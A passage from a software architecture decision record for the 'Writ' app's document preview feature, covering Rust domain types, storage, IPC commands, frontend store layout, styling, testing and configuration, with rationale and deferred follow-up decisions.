per-platform `#[cfg]` branches kept minimal and explicit. Any platform-
specific divergence in security behavior is treated as a release
blocker.

## Consequences

### `writ-core`

New `preview` module exposing pure-domain types. No Tauri, no async,
no I/O. All types `Serialize + Deserialize` for IPC.

```rust
pub struct ContentTypeId(String);

pub enum LayoutMode {
    Source,
    Preview,
    Split { ratio: f32 },
    Detached,
}

pub enum ViewMode { Source, Preview }

pub struct WindowId(u64);

pub struct RendererCapabilities {
    pub supports_live_render: bool,
    pub supports_print: bool,
    pub max_safe_document_bytes: u64,
}

pub struct RenderRequest {
    pub content_type: ContentTypeId,
    pub buffer_text: String,
    pub workspace_root: Option<PathBuf>,
    pub policy: PreviewPolicy,
}

pub struct RenderOutput {
    pub document_html: String,
    pub used_fallback_stylesheet: bool,
    pub parser_warnings: Vec<String>,
}

pub enum RenderError {
    DocumentTooLarge { bytes: u64, limit: u64 },
    InvalidInput { reason: String },
    Internal { reason: String },
}

pub trait ContentRenderer: Send + Sync {
    fn content_type(&self) -> ContentTypeId;
    fn capabilities(&self) -> RendererCapabilities;
    fn render(&self, request: RenderRequest) -> Result<RenderOutput, RenderError>;
}
```

`PreviewPolicy` is also declared in `writ-core` here but populated
fully by ADR-011 (default-deny plus opt-in flags). This ADR commits
that the type exists in `writ-core` so that `ContentRenderer::render`
is callable from a pure-domain test without Tauri.

### `writ-storage`

New table `layout_state` keyed by absolute path. Columns: `layout_mode`
(text), `split_ratio` (real, nullable), `last_view_mode` (text). On
buffer open, the persisted layout is restored; if absent, the
content-type default is used. Migration `010_layout_state.sql` is part
of phase 1.

**Scratch buffers** (buffers with no source path on disk) have no key
into `layout_state` and **do not persist** their layout. They open in
the content-type default every time. If a scratch buffer is later
saved to disk, it acquires a path and from that point on its layout is
persisted like any other buffer. This rule is explicit so the
implementation PR does not invent its own answer.

No other storage changes from this ADR. Trust persistence (`preview_pins`)
is owned by ADR-011; workspace persistence is owned by ADR-010.

### `writ-plugin`

**Untouched in v1.** First-party renderers are host code in
`src-tauri/preview/renderers/`. The `ContentRenderer` trait lives in
`writ-core` (not `writ-plugin`) because it does not declare a plugin
loading boundary; it declares a domain capability. If/when external
renderers ship (separate epic), the loader adapter goes in
`writ-plugin` and implements `ContentRenderer` against the trait
defined here — same pattern as ADR-006.

### `src-tauri`

- New `preview/` module: webview lifecycle (`PreviewWebviewManager`),
  the `writ-preview://` protocol handler (split into `chrome` and
  `document` scopes), the `ContentRendererRegistry` singleton, the
  per-renderer adapters in `preview/renderers/`.
- New `commands/preview.rs` with IPC commands:
  - `preview_open(buffer_id, window_id, layout_mode)`
  - `preview_close(buffer_id, window_id)`
  - `preview_set_layout(buffer_id, window_id, layout_mode)`
  - `preview_render(buffer_id, window_id, text)` — invoked by the
    debouncer after a keystroke
  - `preview_force_render(buffer_id, window_id)` — Cmd+R
  - `preview_detach(buffer_id)` — spawn detached window
  - `preview_list_renderers()` — returns the registered content-type set
  - `preview_print(buffer_id, window_id)` — fires the OS print pipeline
  - `preview_export(buffer_id, window_id, format)` — PDF / HTML
    (rendered) / HTML (source)
- `AppState` gains a `preview_registry: Arc<ContentRendererRegistry>`
  populated at startup via
  `preview::renderers::register_builtins(&mut registry)`.
- `WindowManager` (new) tracks all open `WebviewWindow`s by
  `WindowId` and routes window-scoped IPC to the correct frontend
  instance. Window lifecycle hooks (open, close, focus, blur) emit
  domain events through the existing event bus.
- `tauri.conf.json` declares the `writ-preview` protocol in
  `app.security.csp` (custom protocol whitelist). The main webview
  CSP is unchanged.

### Frontend

- New `src/components/Preview/`:
  - `PreviewPane.tsx` — the host for a single preview webview, used
    by every layout variant
  - `PreviewLayout.tsx` — switches between Source / Preview / Split /
    Detached based on the active tab's `LayoutMode`
  - `PreviewSplit.tsx` — draggable handle, ratio persistence, theme-
    aware divider, 60fps drag using CSS `flex-basis` (no layout
    thrash)
  - `PreviewStatusChip.tsx` — the single discreet status affordance
    in the bottom-right of the preview pane (mode indicator, policy
    indicator, large-document indicator, parser-warning indicator)
- New `src/stores/window/`:
  - `createWindowState.ts` — factory called inside each
    `<WindowProvider>`
  - `layout-store.ts` — per-window active layout per buffer
  - `preview-store.ts` — per-window preview view mode, last render
    timestamp, debounce timer
  - `tab-store.ts` — selected tab per window
  - `focus-store.ts` — focus pane per window
- `src/components/WindowProvider.tsx` — context boundary that
  instantiates a window's state tree and provides `useWindow()`
- `src/stores/global/` directory created; existing singletons that
  remain global (`config.ts`, `theme.ts`, `update.ts`,
  `save-status.ts` for the file-watcher, plus the new
  `renderer-registry.ts` and a `workspaces.ts` per ADR-010) move
  here. Singleton justification comments are amended:
  `// Singleton — app-global, not window-scoped`.
- `src/services/tauri.ts` gains the new preview bindings, all
  strictly typed against the Rust command signatures.
- `src/services/events.ts` gains new event types:
  `PreviewRendered`, `PreviewError`, `LayoutChanged`, `WindowOpened`,
  `WindowClosed`, `WindowFocusChanged`.
- `src/commands/registry.ts` registers the preview-related commands
  with the existing command-palette infrastructure. Each is a
  palette-discoverable action.
- Keymap registrations live in `src/keymap/preview.ts`, integrated
  with the existing shortcut editor.
- The store-layer boundary is enforced by a vitest filesystem-scan
  test at `src/__tests__/architecture/store-layer-boundary.test.ts`,
  following the precedent set by
  `src/__tests__/styles/typography-tokens.test.ts` in ADR-008. ESLint
  is not installed in this repo and adding it for a single rule is
  not justified. The test reads every file under `src/stores/global/`
  and `src/stores/window/`, parses `import` specifiers, and fails if
  any file in `src/stores/global/` imports from `src/stores/window/`
  or vice versa. It also asserts that `src/components/` does not
  reach into `src/stores/window/*` directly without going through
  the `useWindow()` hook. The test runs as part of `pnpm test`,
  which is added to the merge-gate set in the PR that creates the
  directories. If `pnpm test` is not already in the CI gate chain
  for `dev`-targeted PRs (the four gates in CLAUDE.local.md list it
  as a project-level standard but not as a merge gate), the same PR
  adds it.

### Styling

- `src-tauri/assets/preview-base.css` — the fallback stylesheet.
  Bundled into the binary; served by the protocol handler from
  `writ-preview://chrome/preview-base.css`.
- `src/styles/preview-chrome.css` — chrome styles (the status chip,
  the split handle, the detached window's title bar). Lives in the
  main app webview, inherits the existing theme tokens.
- `src/styles/preview-tokens.css` — additional theme tokens used by
  the fallback stylesheet, exposed via inlined `:root` custom
  properties when the protocol handler serves the stylesheet
  (`--writ-preview-bg`, `--writ-preview-fg`, `--writ-preview-accent`,
  `--writ-preview-muted`, `--writ-preview-code-bg`, etc.). These mirror
  the main app theme tokens but live in their own namespace because
  the preview webview cannot reach the main webview's CSS variables.

### Testing

- **Unit (writ-core).** Registry insert / lookup / duplicate-id;
  `ContentRenderer` trait conformance for each first-party renderer;
  `LayoutMode` serialization round-trip; `ViewMode` transition tests.
- **Integration (src-tauri).** Each preview command round-trips
  correctly through the IPC layer. The webview spawns and closes
  without leaks. The protocol handler returns the document for
  `writ-preview://document/*` and the bundled asset for
  `writ-preview://chrome/*`; cross-scope requests are refused.
  Per-renderer render fixtures.
- **Frontend.** `PreviewPane` renders given a mocked IPC. Layout
  switching transitions correctly. The split handle drags within
  ratio bounds. The detach button opens a second `WebviewWindow`
  (mocked) and the state factory produces an independent store
  tree. Multi-window state sync across windows.
- **Performance.** `perf/preview-baseline.rs` captures spawn and
  re-render timings per platform; `perf/preview-regression.rs`
  asserts +20% ceiling on subsequent runs.
- **Accessibility.** Axe-core integration test against the rendered
  preview pane for each renderer's fixture; contrast and landmark
  assertions.
- **Cross-platform.** The integration suite runs on the macOS, Linux,
  Windows matrix in CI.

The security verification suite (the malicious-HTML fixture corpus,
the protocol-handler fuzz, the CSP-bypass tests) is owned by ADR-011
and is built alongside the trust model.

### Configuration

`WritConfig` (already exposed via the settings UI) gains a `preview`
section:

```toml
[preview]
default_layout_html       = "split"     # source | split | preview
default_layout_markdown   = "split"
default_layout_pdf        = "preview"
default_layout_image      = "preview"
default_layout_svg        = "preview"
live_render_threshold_mb  = 1
render_confirm_threshold_mb = 5
render_refuse_threshold_mb  = 50
debounce_ms               = 200
detach_on_open            = false
```

Settings UI gains a `Preview` section with these toggles plus the
keybind editor entries.

## Rationale (composite)

The substrate is forced. Iframe sandboxing is structurally incapable
of blocking subresource exfiltration on the platforms Writ ships on.
A Rust-side AST render foregoes view fidelity and forks the substrate
per content type. A child webview with a custom protocol is the only
substrate where Writ — not the OS, not the renderer's heuristics —
owns the network boundary. ADR-011 makes that ownership explicit; this
ADR commits to the substrate that enables it.

The layout abstraction is forced too. Once detachable preview is
in v1, per-window state is in v1. Singleton stores cannot represent
two windows. The hybrid (E3) is the smallest correct refactor; it
draws a real line between app-global and per-window state, and the
lint rule enforces the line going forward.

The registry follows ADR-006. The same load-bearing pattern — a
trait-object registry that accepts first-party implementations today
and external implementations tomorrow without changing call sites —
is the right shape here for the same reason it was there.

The fallback stylesheet is a quality decision, not a security one.
Inheriting `--writ-font-sans` (ADR-008) is the first reason this epic
is sequenced after typography. A document opened with no own CSS
should look like a writer's tool because Writ is a writer's tool;
that is one CSS file's worth of decision, and it is owned in this
ADR rather than left to the implementation PR.

The keymap matrix is sized to the feature. Cycle, force-render,
fullscreen, exit, detach, swap-orientation, reset-ratio — every action
the layout system needs and nothing it does not. Each binding is
customizable; conflicts are flagged at registration time.

## Open questions deferred to follow-up ADRs

- **Trust, permissions, CSP per scope, verification suite, threat
  model** → **ADR-011**. This ADR depends on it for the actual policy
  bytes; the substrate decision here is what makes it implementable.
- **Workspace primitive, `writ-workspace://` sibling-file protocol,
  workspace-scoped policy** → **ADR-010**. This ADR depends on it for
  the workspace-aware case of relative subresource resolution; the
  preview surface works in the no-workspace case under default-deny.
- **Per-renderer engineering choices** → focused follow-up ADRs in
  the same epic: ADR-012 markdown engine, ADR-013 Mermaid runtime,
  ADR-014 math runtime, ADR-015 PDF engine. Each ADR is short and
  decides one engine.
- **External renderer plugin loading** (WASM, JS, dynlib): separate
  epic. The registry decided here is the integration point and is
  not allowed to break for that future epic.
- **`[preview] detach_persist`**: future opt-in config flag to
  restore detached preview windows across app restart. Default in v1
  is **false** (do not restore). Not implemented in v1; the config
  key is reserved.
- **Side-by-side multi-pane (more than two)**: deferred. Today's
  decision supports one source pane and one preview pane per tab.
  Three-pane workflows can come later behind a new layout variant.
- **Diff/preview hybrid** (rendered diff between source revisions):
  deferred. Future feature.
- **Embedded buffer-to-buffer previews** (preview an HTML buffer
  inside another HTML buffer's preview): deferred. Recursion is not
  supported in v1.

## Minor decisions landing in implementation PRs (not deferred — recorded so the PR author does not re-derive)

- **Scratch buffer layout persistence:** scratch buffers do not key
  into `layout_state` and always open in the content-type default.
  See the `writ-storage` consequences section above. The
  implementation PR for layout persistence references this rule
  rather than inventing its own.
- **Per-buffer crash counter scoping:** the "3 crashes in 60s →
  suspend live render" counter lives in per-window `preview-store`,
  not global state. See the failure-modes section above. The
  implementation PR for the failure-mode chip references this rule.
- **Memory ceiling methodology:** fixed per-platform ceilings plus a
  per-PR delta check against the previous merged commit, **not** a
  historical-baseline ratio. See the performance-budgets section
  above. The implementation PR for the perf integration test
  references this rule rather than implementing "+20% over historical
  baseline."
